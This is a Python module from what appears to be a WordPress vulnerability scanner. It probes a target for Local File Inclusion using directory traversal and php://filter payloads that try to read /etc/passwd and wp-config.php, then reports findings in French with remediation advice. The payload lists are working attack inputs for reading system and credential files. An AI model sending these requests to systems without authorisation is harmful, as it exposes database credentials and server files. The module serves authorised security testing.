"""Local File Inclusion (LFI) scanner for WordPress."""

from __future__ import annotations

import base64
from typing import TYPE_CHECKING

from core.models import Compliance, Evidence, Finding, Severity, Confidence, FindingType
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession

# Common LFI parameter names found in vulnerable WordPress plugins
LFI_PARAMS = ["file", "path", "template", "page", "include", "doc", "folder", "root"]

# Directory traversal payloads targeting sensitive files
TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "etc_passwd"),
    ("....//....//....//etc/passwd", "double_encoding_passwd"),
    ("..%2f..%2f..%2fetc%2fpasswd", "url_encoded_passwd"),
    ("../../../wp-config.php", "wp_config_traversal"),
    ("....//....//....//wp-config.php", "double_encoding_wpconfig"),
]

# PHP wrapper payloads
PHP_WRAPPER_PAYLOADS = [
    ("php://filter/convert.base64-encode/resource=wp-config.php", "php_filter_wpconfig"),
    ("php://filter/convert.base64-encode/resource=../wp-config.php", "php_filter_wpconfig_parent"),
    ("php://filter/convert.base64-encode/resource=../../wp-config.php", "php_filter_wpconfig_grandparent"),
]

# Plugin-specific LFI paths (known vulnerable endpoints)
PLUGIN_LFI_PATHS = [
    "/wp-content/plugins/{slug}/includes/download.php?file=../../../wp-config.php",
    "/wp-content/plugins/{slug}/download.php?file=../../../wp-config.php",
    "/wp-content/plugins/{slug}/lib/file.php?file=../../../wp-config.php",
]

# Indicators of successful LFI
PASSWD_INDICATORS = ["root:x:0:0", "root:*:0:0", "daemon:x:1:1", "bin:x:2:2"]
WPCONFIG_INDICATORS = ["DB_NAME", "DB_PASSWORD", "DB_HOST", "DB_USER", "table_prefix", "AUTH_KEY"]


class LFIScannerModule(BazookaModule):
    name = "vuln.lfi_scanner"
    phase = "vuln"
    description = "Local File Inclusion vulnerability scanner"
    profiles = ["aggressive"]
    intrusive = True

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url
        lfi_found = False

        # Only run in aggressive profile
        if ctx.profile != "aggressive":
            result.status = "skipped"
            return result

        # Collect detected plugin slugs
        plugin_slugs = [p.slug for p in ctx.target.plugins] if ctx.target.plugins else []

        # Test 1: Plugin-specific LFI paths
        for slug in plugin_slugs:
            if lfi_found:
                break
            for path_template in PLUGIN_LFI_PATHS:
                path = path_template.format(slug=slug)
                url = f"{base}{path}"
                try:
                    resp = await session.get(url, use_cache=False)
                    if resp.status_code == 200:
                        body = resp.text
                        if _check_wpconfig(body):
                            lfi_found = True
                            result.add_finding(_make_finding(
                                finding_id="VULN-LFI-001",
                                title=f"LFI confirmee dans le plugin {slug} — wp-config.php expose",
                                url=url,
                                evidence_body=body[:500],
                                status=resp.status_code,
                                vector="plugin_download",
                                module_name=self.name,
                                domain=ctx.target.domain,
                            ))
                            break
                        if _check_passwd(body):
                            lfi_found = True
                            result.add_finding(_make_finding(
                                finding_id="VULN-LFI-002",
                                title=f"LFI confirmee dans le plugin {slug} — /etc/passwd expose",
                                url=url,
                                evidence_body=body[:500],
                                status=resp.status_code,
                                vector="plugin_download",
                                module_name=self.name,
                                domain=ctx.target.domain,
                            ))
                            break
                except Exception:
                    continue

        # Test 2: Common LFI parameters on main site
        if not lfi_found:
            for param in LFI_PARAMS:
                if lfi_found:
                    break
                for payload, payload_name in TRAVERSAL_PAYLOADS:
                    url = f"{base}/?{param}={payload}"
                    try:
                        resp = await session.get(url, use_cache=False)
                        if resp.status_code == 200:
                            body = resp.text
                            if _check_passwd(body):
                                lfi_found = True
                                result.add_finding(_make_finding(
                                    finding_id="VULN-LFI-003",
                                    title=f"LFI via parametre ?{param}= — /etc/passwd expose",
                                    url=url,
                                    evidence_body=body[:500],
                                    status=resp.status_code,
                                    vector=f"param_{param}_{payload_name}",
                                    module_name=self.name,
                                    domain=ctx.target.domain,
                                ))
                                break
                            if _check_wpconfig(body):
                                lfi_found = True
                                result.add_finding(_make_finding(
                                    finding_id="VULN-LFI-004",
                                    title=f"LFI via parametre ?{param}= — wp-config.php expose",
                                    url=url,
                                    evidence_body=body[:500],
                                    status=resp.status_code,
                                    vector=f"param_{param}_{payload_name}",
                                    module_name=self.name,
                                    domain=ctx.target.domain,
                                ))
                                break
                    except Exception:
                        continue

        # Test 3: PHP wrapper payloads
        if not lfi_found:
            for param in LFI_PARAMS[:3]:  # Test top 3 params to limit requests
                if lfi_found:
                    break
                for payload, payload_name in PHP_WRAPPER_PAYLOADS:
                    url = f"{base}/?{param}={payload}"
                    try:
                        resp = await session.get(url, use_cache=False)
                        if resp.status_code == 200:
                            body = resp.text.strip()
                            # Try to decode base64 content
                            if _check_base64_php(body):
                                lfi_found = True
                                result.add_finding(_make_finding(
                                    finding_id="VULN-LFI-005",
                                    title=f"LFI via PHP wrapper (php://filter) — fichier PHP expose",
                                    url=url,
                                    evidence_body=f"Base64 encoded PHP content detected (decoded starts with <?php). Raw: {body[:200]}",
                                    status=resp.status_code,
                                    vector=f"php_wrapper_{payload_name}",
                                    module_name=self.name,
                                    domain=ctx.target.domain,
                                ))
                                break
                    except Exception:
                        continue

        # Test 4: Plugin-specific download endpoints with traversal
        if not lfi_found:
            for slug in plugin_slugs:
                if lfi_found:
                    break
                for param in LFI_PARAMS[:3]:
                    for payload, payload_name in TRAVERSAL_PAYLOADS[:2]:
                        url = f"{base}/wp-content/plugins/{slug}/?{param}={payload}"
                        try:
                            resp = await session.get(url, use_cache=False)
                            if resp.status_code == 200:
                                body = resp.text
                                if _check_passwd(body) or _check_wpconfig(body):
                                    lfi_found = True
                                    detected = "wp-config.php" if _check_wpconfig(body) else "/etc/passwd"
                                    result.add_finding(_make_finding(
                                        finding_id="VULN-LFI-006",
                                        title=f"LFI dans plugin {slug} via ?{param}= — {detected} expose",
                                        url=url,
                                        evidence_body=body[:500],
                                        status=resp.status_code,
                                        vector=f"plugin_{slug}_{param}",
                                        module_name=self.name,
                                        domain=ctx.target.domain,
                                    ))
                                    break
                        except Exception:
                            continue

        if not lfi_found:
            result.add_finding(Finding(
                id="VULN-LFI-000",
                title="Aucune inclusion de fichier local detectee",
                severity=Severity.INFO,
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.INFORMATION_DISCLOSURE,
                description=(
                    f"Aucune vulnerabilite LFI detectee apres test de {len(TRAVERSAL_PAYLOADS)} payloads de traversee, "
                    f"{len(PHP_WRAPPER_PAYLOADS)} wrappers PHP, et {len(plugin_slugs)} plugins."
                ),
                phase="vuln",
                module=self.name,
            ))

        return result

    def should_run(self, ctx) -> bool:
        return ctx.profile == "aggressive"


def _check_passwd(body: str) -> bool:
    """Check if response body contains /etc/passwd indicators."""
    for indicator in PASSWD_INDICATORS:
        if indicator in body:
            return True
    return False


def _check_wpconfig(body: str) -> bool:
    """Check if response body contains wp-config.php indicators."""
    match_count = 0
    for indicator in WPCONFIG_INDICATORS:
        if indicator in body:
            match_count += 1
    # Need at least 2 indicators to reduce false positives
    return match_count >= 2


def _check_base64_php(body: str) -> bool:
    """Check if body contains base64-encoded PHP content."""
    # Try to find base64-encoded content in the body
    # Remove whitespace and try to decode
    for chunk in body.split():
        if len(chunk) < 20:
            continue
        try:
            decoded = base64.b64decode(chunk).decode("utf-8", errors="ignore")
            if decoded.strip().startswith("<?php"):
                return True
            # Also check for wp-config indicators in decoded content
            if _check_wpconfig(decoded):
                return True
        except Exception:
            continue
    # Also try the whole body as base64
    try:
        cleaned = body.strip().replace("\n", "").replace("\r", "").replace(" ", "")
        if len(cleaned) > 20:
            decoded = base64.b64decode(cleaned).decode("utf-8", errors="ignore")
            if decoded.strip().startswith("<?php"):
                return True
            if _check_wpconfig(decoded):
                return True
    except Exception:
        pass
    return False


def _make_finding(
    finding_id: str,
    title: str,
    url: str,
    evidence_body: str,
    status: int,
    vector: str,
    module_name: str,
    domain: str,
) -> Finding:
    """Create a CRITICAL LFI finding."""
    return Finding(
        id=finding_id,
        title=title,
        severity=Severity.CRITICAL,
        cvss_score=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        confidence=Confidence.CONFIRMED,
        finding_type=FindingType.CVE,
        description=(
            f"Une vulnerabilite d'inclusion de fichier local (LFI) a ete confirmee sur {domain}. "
            f"Le vecteur d'attaque utilise: {vector}. "
            f"L'attaquant peut lire des fichiers sensibles du serveur, "
            f"y compris wp-config.php (credentials de base de donnees) et /etc/passwd."
        ),
        evidence=Evidence(
            request=f"GET {url}",
            response_status=status,
            response_body_excerpt=evidence_body,
        ),
        impact=(
            "Lecture de fichiers arbitraires sur le serveur. "
            "Exposition des credentials de base de donnees (wp-config.php), "
            "des fichiers systeme (/etc/passwd), et potentiellement execution de code "
            "via log poisoning ou wrappers PHP."
        ),
        remediation=(
            "Valider et assainir tous les parametres de fichiers cote serveur. "
            "Utiliser des listes blanches au lieu de listes noires. "
            "Desactiver allow_url_include dans php.ini. "
            "Mettre a jour les plugins vulnerables."
        ),
        compliance=Compliance(
            owasp_2021="A03:2021 - Injection",
            cwe="CWE-98",
            mitre_attack="T1005 - Data from Local System",
        ),
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
            "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
        ],
        phase="vuln",
        module=module_name,
        tags=["lfi", "file-inclusion", "traversal", "critical"],
    )
